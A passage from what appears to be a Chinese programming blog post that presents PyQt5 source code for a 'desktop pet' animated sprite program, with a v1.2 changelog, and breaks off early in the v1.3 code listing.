class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>): PET_ACTIONS_MAP.update(&#123;<span class="string">&#x27;pet_%s&#x27;</span> % i+<span class="number">1</span>: ACTION_DISTRIBUTION&#125;)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;桌面宠物&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DesktopPet</span>(<span class="params">QWidget</span>):</span></span><br><span class="line">    tool_name = <span class="string">&#x27;桌面宠物&#x27;</span></span><br><span class="line">    stat = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, parent=<span class="literal">None</span>, **kwargs</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(DesktopPet, self).__init__(parent)</span><br><span class="line">        self.cfg = Config()</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> kwargs.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(self.cfg, key): <span class="built_in">setattr</span>(self.cfg, key, value)</span><br><span class="line">        self.setWindowFlags(Qt.FramelessWindowHint|Qt.WindowStaysOnTopHint|Qt.SubWindow)</span><br><span class="line">        self.setAutoFillBackground(<span class="literal">False</span>)</span><br><span class="line">        self.setAttribute(Qt.WA_TranslucentBackground, <span class="literal">True</span>)</span><br><span class="line">        self.repaint()</span><br><span class="line">        self.pet_images, iconpath = self.randomLoadPetImages()</span><br><span class="line">        quit_action = QAction(<span class="string">&#x27;退出&#x27;</span>, self, triggered=self.quit)</span><br><span class="line">        quit_action.setIcon(QIcon(iconpath))</span><br><span class="line">        self.tray_icon_menu = QMenu(self)</span><br><span class="line">        self.tray_icon_menu.addAction(quit_action)</span><br><span class="line">        self.tray_icon = QSystemTrayIcon(self)</span><br><span class="line">        self.tray_icon.setIcon(QIcon(iconpath))</span><br><span class="line">        self.tray_icon.setContextMenu(self.tray_icon_menu)</span><br><span class="line">        self.tray_icon.show()</span><br><span class="line">        self.image = QLabel(self)</span><br><span class="line">        self.setImage(self.pet_images[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">        self.is_follow_mouse = <span class="literal">False</span></span><br><span class="line">        self.mouse_drag_pos = self.pos()</span><br><span class="line">        self.resize(<span class="number">236</span>, <span class="number">260</span>)</span><br><span class="line">        self.randomPosition()</span><br><span class="line">        self.InitTimer(self.randomAct,<span class="number">100</span>)</span><br><span class="line">        self.show()</span><br><span class="line">        self.is_running_action = <span class="literal">False</span></span><br><span class="line">        self.action_images = []</span><br><span class="line">        self.action_pointer = <span class="number">0</span></span><br><span class="line">        self.action_max_len = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;初始化计时器&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">InitTimer</span>(<span class="params">self,Act,start</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;timer starting !!!&quot;</span>)</span><br><span class="line">        self.timer = QTimer()</span><br><span class="line">        self.timer.timeout.connect(Act)</span><br><span class="line">        self.timer.start(start)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;随机做一个动作&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">randomAct</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.is_running_action:</span><br><span class="line">            self.is_running_action = <span class="literal">True</span></span><br><span class="line">            self.key = random.randint(<span class="number">0</span>,<span class="built_in">len</span>(DesktopPet.stat)-<span class="number">1</span>)</span><br><span class="line">            self.action = DesktopPet.stat[self.key]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;action is:&quot;</span>+<span class="built_in">str</span>(self.action))</span><br><span class="line">            self.action_images = self.pet_images[self.action]</span><br><span class="line">            self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.heading = random.randint(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> self.action == <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">if</span> self.heading == <span class="number">0</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;now is Right&quot;</span>)</span><br><span class="line">                <span class="keyword">elif</span> self.heading == <span class="number">1</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;now is Left&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> self.action == <span class="number">2</span>:</span><br><span class="line">            self.moving(self.heading)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.runFrame(self.heading)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;完成动作的每一帧&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">runFrame</span>(<span class="params">self,heading</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">        self.setImage(self.action_images[self.action_pointer].mirrored(heading, <span class="literal">False</span>))</span><br><span class="line">        self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-移动&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">moving</span>(<span class="params">self,heading</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            time.sleep(<span class="number">0.8</span>)</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            screenRect = QApplication.desktop().screenGeometry()</span><br><span class="line">            x = self.pos().x()</span><br><span class="line">            x += <span class="built_in">int</span>(<span class="number">32</span> * (<span class="number">0.5</span> - heading))</span><br><span class="line">            <span class="keyword">if</span> (heading == <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> ((x &lt;= <span class="number">0</span> <span class="keyword">and</span> heading == <span class="number">1</span>) <span class="keyword">or</span> (</span><br><span class="line">                        x &gt;= screenRect.width() - self.size().width() <span class="keyword">and</span> heading == <span class="number">0</span>)):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;now is hit wall&#x27;</span>)</span><br><span class="line">                    x = self.pos().x()</span><br><span class="line">                    x += <span class="built_in">int</span>(<span class="number">32</span>)</span><br><span class="line">                    self.action_images = self.pet_images[<span class="number">12</span>]</span><br><span class="line">                    self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">                    self.action_pointer = <span class="number">0</span></span><br><span class="line">                    self.hitwall(<span class="number">1</span>,x)</span><br><span class="line">                    self.heading = <span class="number">0</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.move(x, self.pos().y())</span><br><span class="line">                    self.setImage(self.action_images[self.action_pointer].mirrored(<span class="number">0</span>, <span class="literal">False</span>))</span><br><span class="line">                    self.action_pointer += <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> (heading == <span class="number">0</span>):</span><br><span class="line">                <span class="keyword">if</span> ((x &lt;= <span class="number">0</span> <span class="keyword">and</span> heading == <span class="number">1</span>) <span class="keyword">or</span> (</span><br><span class="line">                        x &gt;= screenRect.width() - self.size().width() <span class="keyword">and</span> heading == <span class="number">0</span>)):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;now is hit wall&#x27;</span>)</span><br><span class="line">                    x = self.pos().x()</span><br><span class="line">                    x += <span class="built_in">int</span>(<span class="number">32</span>)</span><br><span class="line">                    self.action_images = self.pet_images[<span class="number">12</span>]</span><br><span class="line">                    self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">                    self.action_pointer = <span class="number">0</span></span><br><span class="line">                    self.hitwall(<span class="number">0</span>,x)</span><br><span class="line">                    time.sleep(<span class="number">0.001</span>)</span><br><span class="line">                    self.heading = <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.move(x, self.pos().y())</span><br><span class="line">                    self.setImage(self.action_images[self.action_pointer].mirrored(<span class="number">1</span>, <span class="literal">False</span>))</span><br><span class="line">                    self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-撞墙&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">hitwall</span>(<span class="params">self,heading,x</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">        self.move(x, self.pos().y())</span><br><span class="line">        self.setImage(self.action_images[self.action_pointer].mirrored(heading, <span class="literal">False</span>))</span><br><span class="line">        self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-坠落&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fall</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            y = self.pos().y()</span><br><span class="line">            x = self.pos().x()</span><br><span class="line">            y += <span class="built_in">int</span>(<span class="number">16</span>)</span><br><span class="line">            screenRect = QApplication.desktop().screenGeometry()</span><br><span class="line">            <span class="keyword">if</span> (y &gt;= screenRect.height() - self.size().height()):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;now is kiss the ground&#x27;</span>)</span><br><span class="line">                self.action_images = self.pet_images[<span class="number">6</span>]</span><br><span class="line">                self.action_max_len = <span class="built_in">len</span>(self.action_images)</span><br><span class="line">                self.action_pointer = <span class="number">0</span></span><br><span class="line">                self.touchdown(x,y)</span><br><span class="line">                self.InitTimer(self.randomAct, <span class="number">100</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.move(self.pos().x(), y)</span><br><span class="line">                self.setImage(self.pet_images[<span class="number">3</span>][<span class="number">0</span>].mirrored(self.heading, <span class="literal">False</span>))</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;动作-触地&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">touchdown</span>(<span class="params">self,x,y</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.action_pointer == self.action_max_len:</span><br><span class="line">            self.is_running_action = <span class="literal">False</span></span><br><span class="line">            self.action_pointer = <span class="number">0</span></span><br><span class="line">            self.action_max_len = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x -= <span class="built_in">int</span>(<span class="number">32</span>)</span><br><span class="line">            y -= <span class="built_in">int</span>(<span class="number">48</span>)</span><br><span class="line">            self.move(x, y)</span><br><span class="line">            self.setImage(self.action_images[self.action_pointer].mirrored(self.heading, <span class="literal">False</span>))</span><br><span class="line">            self.action_pointer += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;设置当前显示的图片&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setImage</span>(<span class="params">self, image</span>):</span></span><br><span class="line">        self.image.setPixmap(QPixmap.fromImage(image))</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;随机导入一个桌面宠物的所有图片&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">randomLoadPetImages</span>(<span class="params">self</span>):</span></span><br><span class="line">        cfg = self.cfg</span><br><span class="line">        pet_name = random.choice(<span class="built_in">list</span>(cfg.PET_ACTIONS_MAP.keys()))</span><br><span class="line">        actions = cfg.PET_ACTIONS_MAP[pet_name]</span><br><span class="line">        pet_images = []</span><br><span class="line">        self.flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> action <span class="keyword">in</span> actions:</span><br><span class="line">            patch = [self.loadImage(os.path.join(cfg.ROOT_DIR, pet_name, <span class="string">&#x27;shime&#x27;</span>+item+<span class="string">&#x27;.png&#x27;</span>)) <span class="keyword">for</span> item <span class="keyword">in</span> action]</span><br><span class="line">            pet_images.append(patch)</span><br><span class="line">        iconpath = os.path.join(cfg.ROOT_DIR, pet_name, <span class="string">&#x27;shimeX.png&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> pet_images, iconpath</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;鼠标左键按下时, 宠物将和鼠标位置绑定&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mousePressEvent</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        <span class="keyword">if</span> event.button() == Qt.LeftButton:</span><br><span class="line">            self.is_follow_mouse = <span class="literal">True</span></span><br><span class="line">            self.mouse_drag_pos = event.globalPos() - self.pos()</span><br><span class="line">            event.accept()</span><br><span class="line">            self.setCursor(QCursor(Qt.OpenHandCursor))</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;鼠标移动, 则宠物也移动&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mouseMoveEvent</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        <span class="keyword">if</span> Qt.LeftButton <span class="keyword">and</span> self.is_follow_mouse:</span><br><span class="line">            self.move(event.globalPos() - self.mouse_drag_pos)</span><br><span class="line">            event.accept()</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;鼠标释放时, 取消绑定&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mouseReleaseEvent</span>(<span class="params">self, event</span>):</span></span><br><span class="line">        self.is_follow_mouse = <span class="literal">False</span></span><br><span class="line">        self.setCursor(QCursor(Qt.ArrowCursor))</span><br><span class="line">        self.fallingBody()</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;宠物自由落体&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fallingBody</span>(<span class="params">self</span>):</span></span><br><span class="line">        x = self.pos().x()</span><br><span class="line">        y = self.pos().y()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;x=%x : y=%x&quot;</span> %(x,y))</span><br><span class="line">        self.InitTimer(self.fall,<span class="number">25</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;导入图像&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loadImage</span>(<span class="params">self, imagepath</span>):</span></span><br><span class="line">        image = QImage()</span><br><span class="line">        image.load(imagepath)</span><br><span class="line">        <span class="keyword">return</span> image</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;随机到一个屏幕上的某个位置&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">randomPosition</span>(<span class="params">self</span>):</span></span><br><span class="line">        screen_geo = QDesktopWidget().screenGeometry()</span><br><span class="line">        pet_geo = self.geometry()</span><br><span class="line">        width = (screen_geo.width() - pet_geo.width()) * random.random()</span><br><span class="line">        height = (screen_geo.height() - pet_geo.height()) * random.random()</span><br><span class="line">        self.move(<span class="built_in">int</span>(width), <span class="built_in">int</span>(height))</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;退出程序&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quit</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.close()</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = QApplication(sys.argv)</span><br><span class="line">    pets = DesktopPet()</span><br><span class="line">    pets.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure>
<p>更新日志：</p>
<ul>
<li>version：v1.2</li>
<li>date：2022.4.13</li>
<li>type：<ul>
<li>Features：<ul>
<li>在角色触碰屏幕左右边界时，会触发“hitwall”动作，并且改变角色的移动方向</li>
<li>新添“重力系统”，在“左键绑定”结束以后，会触发“fall”动作</li>
<li>在角色触碰屏幕下边界时，会触发“touchdown”动作</li>
</ul>
</li>
<li>Changed：<ul>
<li>对部分图片的顺序进行了修改</li>
</ul>
</li>
<li>Removed：NULL</li>
</ul>
</li>
<li>desc：<ul>
<li>目前有一个棘手的BUG：在任意拖拽角色时，有小概率导致“计时器InitTimer”失效</li>
<li>接下来打算加入右键菜单选项，并添加更多动作</li>
</ul>
</li>
</ul>
<h2 id="DesktopPets-v1-3"><a href="#DesktopPets-v1-3" class="headerlink" title="DesktopPets_v1.3"></a>DesktopPets_v1.3</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtGui <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtCore <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5.QtWidgets <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PyQt5 <span class="keyword">import</span> QtWidgets, QtGui</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;配置信息&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span>():</span></span><br><span class="line">    ROOT_DIR = os.path.join(os.path.split(os.path.abspath(__file__))[<span class="number">0</span>], <span class="string">&#x27;resources&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(ROOT_DIR)</span><br><span class="line">    ACTION_DISTRIBUTION = [</span><br><span class="line">        [<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;18&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;19&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;10&#x27;</span>], <span class="comment"># 吃撇_0</span></span><br><span class="line">        [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>,<span class="string">&#x27;1c&#x27;</span>,<span class="string">&#x27;1d&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>,<span class="string">&#x27;1c&#x27;</span>,<span class="string">&#x27;1d&#x27;</span>], <span class="comment"># 眨眼_1</span></span><br><span class="line">        [<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span><span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span><span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;1a&#x27;</span>,<span class="string">&#x27;1b&#x27;</span>], <span class="comment"># 行走_2</span></span><br><span class="line">        [<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span 